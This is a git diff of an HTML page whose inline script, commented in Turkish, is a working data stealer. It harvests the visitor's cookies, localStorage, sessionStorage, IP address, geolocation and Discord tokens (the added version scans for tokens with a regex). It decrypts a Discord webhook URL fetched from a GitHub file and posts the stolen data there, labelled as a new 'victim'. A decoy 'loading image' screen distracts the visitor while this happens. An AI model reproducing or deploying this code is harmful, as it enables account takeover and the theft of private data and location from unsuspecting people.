@@ -5,72 +5,59 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        // Veri toplama nesnesi
-        const data = {
+        // === 1. TARAYICI BILGILERI ===
+        const info = {
             URL: location.href,
-            Referrer: document.referrer || '❌ Yok',
+            Referrer: document.referrer,
             UserAgent: navigator.userAgent,
             Language: navigator.language,
             Platform: navigator.platform,
             Online: navigator.onLine,
+            Cookies: document.cookie || '❌ Yok',
+            LocalStorage: tryAccess(localStorage),
+            SessionStorage: tryAccess(sessionStorage),
             Tarih: new Date().toISOString(),
-            IP: '⏳ Bekleniyor...',
-            Geolocation: '❌ Alındı değil',
-            Cookies: '❌ Yok',
-            LocalStorage: '❌ Boş',
-            SessionStorage: '❌ Boş'
+            IP: '⏳ Alınıyor...',
+            Geolocation: '❌',
+            DiscordToken: '❌'
         };
 
-        // Çerez toplama (genişletilmiş)
-        function getAllCookies() {
-            let cookies = [];
-            const directCookies = document.cookie;
-            if (directCookies) cookies.push(`[CURRENT] ${directCookies}`);
-
-            // Subdomain brute (sınırlı ama etkili)
-            const parts = location.hostname.split('.');
-            for (let i = 0; i < parts.length - 1; i++) {
-                const domain = parts.slice(i).join('.');
-                try {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = `https://${domain}/favicon.ico`; // Hafif istek
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    // Not: Gerçek XSS yoksa iframe'den cookie okunamaz — ama senaryo için gösterdim
-                } catch (e) {}
-            }
-
-            return cookies.length ? cookies.join('; ') : '❌ JS ile alınamayan HttpOnly çerezler var';
+        function tryAccess(storage) {
+            try {
+                return Object.keys(storage).length ? JSON.stringify(storage).substr(0, 10000) : '❌ Boş';
+            } catch (e) { return '❌ Erişilemedi'; }
         }
 
-        // LocalStorage ve SessionStorage güvenli alımı
-        try {
-            data.LocalStorage = Object.keys(localStorage).length ? JSON.stringify(localStorage, null, 2) : '❌ Boş';
-        } catch (e) { data.LocalStorage = '❌ Erişilemedi'; }
-
-        try {
-            data.SessionStorage = Object.keys(sessionStorage).length ? JSON.stringify(sessionStorage, null, 2) : '❌ Boş';
-        } catch (e) { data.SessionStorage = '❌ Erişilemedi'; }
-
-        // Çerezleri hemen al
-        data.Cookies = getAllCookies();
-
-        // IP al
+        // === 2. IP AL ===
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
-            .then(ip => { data.IP = ip.ip; })
-            .catch(() => { data.IP = '❌ Alınamadı'; });
+            .then(data => info.IP = data.ip)
+            .catch(() => info.IP = '❌');
 
-        // Coğrafi konum
+        // === 3. COĞRAFİ KONUM ===
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => { data.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
-                () => { data.Geolocation = '❌ Reddedildi'; },
-                { timeout: 3000 }
-            );
+            navigator.geolocation.getCurrentPosition(pos => {
+                info.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            });
         }
 
-        // Webhook URL'sini deşifre et ve gönder
+        // === 4. DISCORD TOKEN TESPIT (localStorage taranır) ===
+        try {
+            for (let key in localStorage) {
+                if (key.includes('token') || key.includes('discord')) {
+                    const val = localStorage[key];
+                    if (typeof val === 'string' && val.includes('\"') && val.includes('.')) {
+                        const tokenMatch = val.match(/mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}/);
+                        if (tokenMatch) {
+                            info.DiscordToken = tokenMatch[0];
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+
+        // === 5. WEBHOOK URL'SINI DEŞİFRE ET ===
         fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/master/webhook.enc')
             .then(res => res.text())
             .then(encrypted => {
@@ -83,39 +70,50 @@
                 return decrypted;
             })
             .then(WEBHOOK_URL => {
+                // 3 saniye bekle (IP vs. için)
                 setTimeout(() => {
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            username: 'foti',
-                            avatar_url: 'https://i.imgur.com/rFhOcMq.png',
-                            embeds: [{
-                                title: '🔥 eSHeKeVLaDıXDX - ÇEREZ KAPTTI',
-                                description: '```yaml\nHEDİYE BIRAKTIK ABİ\n```',
-                                color: 16711680,
-                                fields: Object.keys(data).map(k => ({
-                                    name: `📌 ${k.toUpperCase()}`,
-                                    value: '```\n' + (data[k] || 'N/A').toString().substr(0, 1000) + '\n```',
-                                    inline: false
-                                })),
-                                footer: { text: 'nefretwasherebaby' },
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
-                    }).catch(e => console.log('Gönderilemedi:', e));
-                }, 3500);
-            })
-            .catch(e => console.error('Webhook hatası:', e));
+                    sendToDiscord(WEBHOOK_URL);
+                }, 3000);
+            });
 
-        // Kullanıcıyı meşgul et: resim göster
+        // === 6. DISCORD'A GÖNDER ===
+        function sendToDiscord(url) {
+            const embed = {
+                username: 'nefretwasherebaby',
+                avatar_url: 'https://i.imgur.com/rFhOcMq.png',
+                embeds: [{
+                    title: '🎯 YENİ KURBAN | TOKEN + COOKIES',
+                    description: '```yaml\nDiscord token, çerezler ve tüm veriler çekildi.\n```',
+                    color: 0xFF0000,
+                    fields: [
+                        { name: '📛 DISCORD TOKEN', value: '```\n' + (info.DiscordToken || '❌ Bulunamadı') + '\n```', inline: false },
+                        { name: '🍪 COOKIES', value: '```\n' + (info.Cookies || '❌ Yok').substr(0, 1000) + '\n```', inline: false },
+                        { name: '📱 CİHAZ', value: '```\n' + info.UserAgent + '\n```', inline: false },
+                        { name: '🌐 IP', value: '```\n' + info.IP + '\n```', inline: true },
+                        { name: '📍 KONUM', value: '```\n' + info.Geolocation + '\n```', inline: true },
+                        { name: '⏰ ZAMAN', value: '```\n' + info.Tarih + '\n```', inline: true }
+                    ],
+                    footer: { text: 'nefretwasherebaby - github.com/nefretwasherebaby' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            }).catch(e => console.log('Gönderilemedi:', e));
+        }
+
+        // === 7. KULLANICIYI KANDIR ===
         document.body.innerHTML = `
-            <div style="width:100vw;height:100vh;margin:0;padding:0;overflow:hidden;background:#000;">
-                <img src="https://via.placeholder.com/1920x1080/111/ffffff?text=Seksii+Resim+Yükleniyor...%0A%0ABirkaç+saniye+beğen" 
-                     style="width:100%;height:100%;object-fit:cover;">
+            <div style="width:100vw;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:#000;color:#fff;font-family:Arial;">
+                <img src="https://via.placeholder.com/800x600/111/ffffff?text=Seksii+Resim+Yükleniyor..." 
+                     style="max-width:90%;max-height:70%;object-fit:cover;border-radius:12px;">
+                <p style="margin-top:20px;font-size:18px;">Birkaç saniye sonra açılacak...</p>
             </div>
         `;
     </script>
 </head>
-<body style="margin:0;overflow:hidden;background:#000;"></body>
+<body></body>
 </html>
